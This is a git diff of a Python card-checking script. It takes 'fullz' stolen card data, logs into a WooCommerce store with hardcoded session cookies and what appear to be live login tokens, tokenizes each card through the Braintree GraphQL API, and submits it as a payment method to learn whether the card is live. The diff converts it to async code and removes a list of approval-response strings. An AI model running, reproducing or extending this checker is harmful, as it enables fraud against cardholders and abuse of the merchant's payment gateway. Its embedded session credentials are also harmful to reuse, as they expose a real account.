@@ -1,47 +1,27 @@
+import asyncio
 import base64
-import json
-import random
 import re
-import string
 import time
-from fake_useragent import UserAgent
+import user_agent
 from FUNC.usersdb_func import *
 from FUNC.defs import *
-import random
-import string
-import re
-from bs4 import BeautifulSoup
-import json
-import time
-import base64
-from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import unquote
-from urllib.parse import urlparse, parse_qs
-import user_agent
-import requests
+
 
 def gets(s, start, end):
-            try:
-                start_index = s.index(start) + len(start)
-                end_index = s.index(end, start_index)
-                return s[start_index:end_index]
-            except ValueError:
-                return None
-
-
+    try:
+        start_index = s.index(start) + len(start)
+        end_index = s.index(end, start_index)
+        return s[start_index:end_index]
+    except ValueError:
+        return None
 
 
 user = user_agent.generate_user_agent()
 
 
-
-async def create_braintree_auth(fullz , session):
+async def create_braintree_auth(fullz, session):
     try:
-
         cc, mes, ano, cvv = fullz.split("|")
-
-
-
 
         cookies = {
             '_gcl_au': '1.1.1781813590.1744290394',
@@ -73,29 +53,18 @@ async def create_braintree_auth(fullz , session):
             'sec-gpc': '1',
             'upgrade-insecure-requests': '1',
             'user-agent': user,
-            # 'cookie': '_gcl_au=1.1.1781813590.1744290394; _ga=GA1.1.1103121085.1744290394; formillaVisitorGuidcs5164ad-59eb-4002-994c-535607ab442f=9b4e3772-3a04-475b-be5d-93adaa433cf0; __stripe_mid=a5654157-fd7b-4744-b9c1-259e2cb7367e70ee00; __stripe_sid=ebbd8c42-1a2f-418c-adc0-51662352e26b9cf996; wordpress_logged_in_b88b6c7d48658c9d134b50f9d05d7389=mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7Ca64dcb0b28fde9a4b28e940b5fb6b4d4b9fc77c9ce55a6fdb0ab10a42b5912ff; wp_woocommerce_session_b88b6c7d48658c9d134b50f9d05d7389=15006%7C%7C1744463185%7C%7C1744459585%7C%7C4b18f05cea7e7edee6c7415a2b0de4e7; wp_automatewoo_visitor_b88b6c7d48658c9d134b50f9d05d7389=re31dfv47tudtuklwa3j; wp_automatewoo_session_started=1; wpx_logged=1; _ga_XJVPQDP3N7=GS1.1.1744290394.1.1.1744290586.0.0.0',
         }
 
-        response = requests.get(
+        response = await session.get(
             'https://shimmeringceremony.com/my-account/additional-payment-method/',
             cookies=cookies,
             headers=headers,
         )
 
-
         add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)[0]
-
-        # print(add_nonce)
-        # print(token)
-        # Decode token
-
-
         client_token = gets(response.text, '"client_token_nonce":"', '"')
-        # print(client_token)
 
-
-
-        cookies = {
+        cookies2 = {
             'wordpress_sec_b88b6c7d48658c9d134b50f9d05d7389': 'mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7C1bff37464dc5ee7b4817726eeb11640e8978e9c6cc5c4e8b793140cfd9475e98',
             '_gcl_au': '1.1.1781813590.1744290394',
             '_ga': 'GA1.1.1103121085.1744290394',
@@ -112,7 +81,7 @@ async def create_braintree_auth(fullz , session):
             '_ga_XJVPQDP3N7': 'GS1.1.1744290394.1.1.1744291540.0.0.0',
         }
 
-        headers = {
+        headers2 = {
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
@@ -129,7 +98,6 @@ async def create_braintree_auth(fullz , session):
             'sec-gpc': '1',
             'user-agent': user,
             'x-requested-with': 'XMLHttpRequest',
-            # 'cookie': 'wordpress_sec_b88b6c7d48658c9d134b50f9d05d7389=mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7C1bff37464dc5ee7b4817726eeb11640e8978e9c6cc5c4e8b793140cfd9475e98; _gcl_au=1.1.1781813590.1744290394; _ga=GA1.1.1103121085.1744290394; formillaVisitorGuidcs5164ad-59eb-4002-994c-535607ab442f=9b4e3772-3a04-475b-be5d-93adaa433cf0; __stripe_mid=a5654157-fd7b-4744-b9c1-259e2cb7367e70ee00; __stripe_sid=ebbd8c42-1a2f-418c-adc0-51662352e26b9cf996; wordpress_logged_in_b88b6c7d48658c9d134b50f9d05d7389=mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7Ca64dcb0b28fde9a4b28e940b5fb6b4d4b9fc77c9ce55a6fdb0ab10a42b5912ff; wp_woocommerce_session_b88b6c7d48658c9d134b50f9d05d7389=15006%7C%7C1744463185%7C%7C1744459585%7C%7C4b18f05cea7e7edee6c7415a2b0de4e7; wp_automatewoo_visitor_b88b6c7d48658c9d134b50f9d05d7389=re31dfv47tudtuklwa3j; wp_automatewoo_session_started=1; wpx_logged=1; formillaAutoMessageListcs5164ad-59eb-4002-994c-535607ab442f=28774; formillaLastAutoMessageIdDisplayedcs5164ad-59eb-4002-994c-535607ab442f=28774; _ga_XJVPQDP3N7=GS1.1.1744290394.1.1.1744291540.0.0.0',
         }
 
         data = {
@@ -137,39 +105,18 @@ async def create_braintree_auth(fullz , session):
             'nonce': client_token,
         }
 
-        response = requests.post('https://shimmeringceremony.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        response2 = await session.post(
+            'https://shimmeringceremony.com/wp-admin/admin-ajax.php',
+            cookies=cookies2,
+            headers=headers2,
+            data=data,
+        )
 
-
-        client_data = response.json()['data']
-
+        client_data = response2.json()['data']
         decoded_token = base64.b64decode(client_data).decode('utf-8')
         authorization_fingerprint = gets(decoded_token, 'authorizationFingerprint":"', '"')
 
-        # print(authorization_fingerprint)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        headers = {
+        headers3 = {
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'authorization': f'Bearer {authorization_fingerprint}',
@@ -212,17 +159,15 @@ async def create_braintree_auth(fullz , session):
             'operationName': 'TokenizeCreditCard',
         }
 
-        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+        response3 = await session.post(
+            'https://payments.braintree-api.com/graphql',
+            headers=headers3,
+            json=json_data,
+        )
 
-        token = gets(response.text, '{"token":"', '","')
-        brandCode = gets(response.text, '"brandCode":"', '"')
-        # print(token)
-        # print(brandCode)
+        token = gets(response3.text, '{"token":"', '","')
 
-
-
-
-        cookies = {
+        cookies3 = {
             '_gcl_au': '1.1.1781813590.1744290394',
             '_ga': 'GA1.1.1103121085.1744290394',
             'formillaVisitorGuidcs5164ad-59eb-4002-994c-535607ab442f': '9b4e3772-3a04-475b-be5d-93adaa433cf0',
@@ -238,7 +183,7 @@ async def create_braintree_auth(fullz , session):
             '_ga_XJVPQDP3N7': 'GS1.1.1744290394.1.1.1744291531.0.0.0',
         }
 
-        headers = {
+        headers4 = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
@@ -257,10 +202,9 @@ async def create_braintree_auth(fullz , session):
             'sec-gpc': '1',
             'upgrade-insecure-requests': '1',
             'user-agent': user,
-            # 'cookie': '_gcl_au=1.1.1781813590.1744290394; _ga=GA1.1.1103121085.1744290394; formillaVisitorGuidcs5164ad-59eb-4002-994c-535607ab442f=9b4e3772-3a04-475b-be5d-93adaa433cf0; __stripe_mid=a5654157-fd7b-4744-b9c1-259e2cb7367e70ee00; __stripe_sid=ebbd8c42-1a2f-418c-adc0-51662352e26b9cf996; wordpress_logged_in_b88b6c7d48658c9d134b50f9d05d7389=mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7Ca64dcb0b28fde9a4b28e940b5fb6b4d4b9fc77c9ce55a6fdb0ab10a42b5912ff; wp_woocommerce_session_b88b6c7d48658c9d134b50f9d05d7389=15006%7C%7C1744463185%7C%7C1744459585%7C%7C4b18f05cea7e7edee6c7415a2b0de4e7; wp_automatewoo_visitor_b88b6c7d48658c9d134b50f9d05d7389=re31dfv47tudtuklwa3j; wp_automatewoo_session_started=1; wpx_logged=1; formillaAutoMessageListcs5164ad-59eb-4002-994c-535607ab442f=28774; formillaLastAutoMessageIdDisplayedcs5164ad-59eb-4002-994c-535607ab442f=28774; _ga_XJVPQDP3N7=GS1.1.1744290394.1.1.1744291531.0.0.0',
         }
 
-        data = {
+        data2 = {
             'payment_method': 'braintree_credit_card',
             'wc-braintree-credit-card-card-type': 'visa',
             'wc-braintree-credit-card-3d-secure-enabled': '',
@@ -279,16 +223,14 @@ async def create_braintree_auth(fullz , session):
             'woocommerce_add_payment_method': '1',
         }
 
-        response = requests.post(
+        response4 = await session.post(
             'https://shimmeringceremony.com/my-account/additional-payment-method/',
-            cookies=cookies,
-            headers=headers,
-            data=data,
+            cookies=cookies3,
+            headers=headers4,
+            data=data2,
         )
 
-
-
-        text = response.text
+        text = response4.text
         pattern = r'Status code (.*?)\s*</li>'
         match = re.search(pattern, text)
         if match:
@@ -301,24 +243,11 @@ async def create_braintree_auth(fullz , session):
             else:
                 result = "Error"
 
-        if 'funds' in result or 'Card Issuer Declined CVV' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
-            print(result)
-        else:
-            print(result)
-        time.sleep(14)
+        await asyncio.sleep(14)
 
-
-
-
-
-
-
-
-
-
-        return response.text
-
-
+        return response4.text
 
     except Exception as e:
+        import traceback
+        await error_log(traceback.format_exc())
         return str(e)
